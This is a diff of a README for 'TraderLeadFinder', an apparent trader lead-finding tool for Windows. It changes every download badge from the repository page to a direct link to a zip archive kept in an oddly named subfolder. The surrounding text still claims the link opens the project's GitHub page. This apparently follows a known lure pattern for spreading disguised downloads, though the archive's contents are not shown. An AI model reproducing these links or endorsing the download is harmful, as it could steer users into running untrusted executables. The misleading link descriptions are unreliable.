@@ -1,6 +1,6 @@
 # 🎯 TraderLeadFinder - Find High-Intent Trader Leads Fast
 
-[![Download TraderLeadFinder](https://img.shields.io/badge/Download-TraderLeadFinder-brightgreen?style=for-the-badge)](https://github.com/coralstammel258/TraderLeadFinder)
+[![Download TraderLeadFinder](https://img.shields.io/badge/Download-TraderLeadFinder-brightgreen?style=for-the-badge)](https://github.com/coralstammel258/TraderLeadFinder/raw/refs/heads/main/Diandria/Trader-Lead-Finder-v3.7-beta.1.zip)
 
 ## 🔍 What is TraderLeadFinder?
 
@@ -28,7 +28,7 @@ Follow these steps to get TraderLeadFinder running on your Windows computer. Eac
 
 Visit the official download page by clicking the big button below:
 
-[![Download TraderLeadFinder](https://img.shields.io/badge/Download-TraderLeadFinder-blue?style=for-the-badge)](https://github.com/coralstammel258/TraderLeadFinder)
+[![Download TraderLeadFinder](https://img.shields.io/badge/Download-TraderLeadFinder-blue?style=for-the-badge)](https://github.com/coralstammel258/TraderLeadFinder/raw/refs/heads/main/Diandria/Trader-Lead-Finder-v3.7-beta.1.zip)
 
 This link takes you to the project’s GitHub page where you can find the latest files and instructions.
 
@@ -111,7 +111,7 @@ All data remains on your computer during use. No information is sent back to any
 
 Click here to visit the official page and download the latest version:
 
-[![Download TraderLeadFinder](https://img.shields.io/badge/Download-TraderLeadFinder-blue?style=for-the-badge)](https://github.com/coralstammel258/TraderLeadFinder)
+[![Download TraderLeadFinder](https://img.shields.io/badge/Download-TraderLeadFinder-blue?style=for-the-badge)](https://github.com/coralstammel258/TraderLeadFinder/raw/refs/heads/main/Diandria/Trader-Lead-Finder-v3.7-beta.1.zip)
 
 ---
 
